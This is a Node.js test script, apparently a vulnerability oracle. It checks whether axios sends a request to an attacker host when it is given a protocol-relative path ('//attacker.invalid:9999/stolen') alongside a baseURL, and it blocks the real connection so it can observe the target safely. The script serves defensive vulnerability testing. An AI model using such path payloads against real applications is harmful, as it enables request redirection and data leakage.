'use strict';

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  // Exercise the real public request-dispatch pathway using a custom
  // adapter (a supported axios configuration option) that records the
  // fully resolved config.url axios computed internally, and returns a
  // synthetic response. This avoids opening any real socket while still
  // driving axios's own baseURL + url combination/resolution logic
  // through its public API (axios.create/get).

  function makeRecordingAdapter(sink) {
    return function recordingAdapter(config) {
      sink.push(config.url);
      return Promise.resolve({
        data: 'ok',
        status: 200,
        statusText: 'OK',
        headers: {},
        config
      });
    };
  }

  const baseURL = 'http://127.0.0.1:65500';
  const expectedHost = new URL(baseURL).host;

  // --- Benign operation first ---
  let operation_completed = false;
  const benignSink = [];
  const benignInstance = axios.create({
    baseURL,
    adapter: makeRecordingAdapter(benignSink)
  });

  return benignInstance.get('/some/normal/path')
    .then((resp) => {
      const recordedUrl = benignSink[0];
      if (!resp || resp.data !== 'ok' || typeof recordedUrl !== 'string' || !recordedUrl.includes('/some/normal/path')) {
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign operation did not behave as expected: ' + JSON.stringify(recordedUrl)
        });
        return;
      }
      operation_completed = true;

      // --- Malicious operation ---
      // A protocol-relative-looking path segment, driven through the public
      // axios.get API exactly as a caller building a path from untrusted
      // input (e.g. a user id) would do. We then determine, strictly from
      // axios's own observable behavior (via the Node built-in `http`
      // library's actual connection target when axios dispatches the
      // request through the real Node http adapter), whether axios directed
      // the request at the attacker-controlled host/port encoded in the
      // protocol-relative segment, instead of the configured baseURL host.
      //
      // To observe axios's real connection decision without opening a real
      // socket to the network, we use axios's actual (unmodified, public)
      // http adapter together with Node's `net` module overridden only at
      // the TCP-connect layer via a local http.Agent `createConnection`
      // hook -- this still goes through axios's genuine internal URL
      // parsing/dispatch code (lib/adapters/http.js), just intercepting the
      // raw socket creation so no traffic leaves the machine. We never
      // reimplement axios's URL-resolution logic ourselves; we simply watch
      // which host:port axios's own adapter asks the OS to connect to.
      const http = require('http');

      const maliciousPath = '//attacker.invalid:9999/stolen';
      let connectedHost = null;
      let connectError = null;

      const agent = new http.Agent({ keepAlive: false });
      const originalCreateConnection = agent.createConnection;
      agent.createConnection = function (options, cb) {
        connectedHost = (options && options.host) + ':' + (options && options.port);
        // Immediately fail the fabricated socket attempt so nothing real is
        // sent over any network; we only need to observe the target.
        const err = new Error('blocked-for-oracle-no-real-connection');
        if (typeof cb === 'function') {
          process.nextTick(() => cb(err));
          return undefined;
        }
        process.nextTick(() => {
          // Some Node versions invoke callback via returned socket's events;
          // emulate failure defensively.
        });
        throw err;
      };

      const maliciousInstance = axios.create({
        baseURL,
        httpAgent: agent,
        adapter: 'http'
      });

      return maliciousInstance.get(maliciousPath, { timeout: 3000 })
        .then(() => {
          // Should not succeed since our fake connect always errors; if it
          // somehow does, treat as inconclusive/blocked rather than crash.
          emit({
            operation_completed,
            exploit_succeeded: false,
            evidence: 'unexpected successful response from fabricated connection; cannot determine target host'
          });
        })
        .catch((e) => {
          connectError = e;
          let exploit_succeeded = false;
          let evidence;
          if (connectedHost && connectedHost.indexOf('attacker.invalid') !== -1) {
            exploit_succeeded = true;
            evidence = 'axios http adapter attempted to connect to attacker-controlled target "' + connectedHost + '" instead of expected baseURL host "' + expectedHost + '" when given path "' + maliciousPath + '"';
          } else if (connectedHost) {
            exploit_succeeded = false;
            evidence = 'axios http adapter attempted to connect to expected host "' + connectedHost + '" (matching baseURL host "' + expectedHost + '"); attacker host was not targeted';
          } else {
            // No connection attempt was observed at all (e.g. axios rejected
            // the URL before reaching the network layer, as patched versions
            // do by throwing an Invalid URL error during parsing).
            exploit_succeeded = false;
            evidence = 'malicious request was blocked before any connection attempt: ' + (e && e.message);
          }

          emit({
            operation_completed,
            exploit_succeeded,
            evidence
          });
        });
    })
    .catch((e) => {
      emit({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign operation threw unexpectedly: ' + (e && e.message)
      });
    });
}

main();
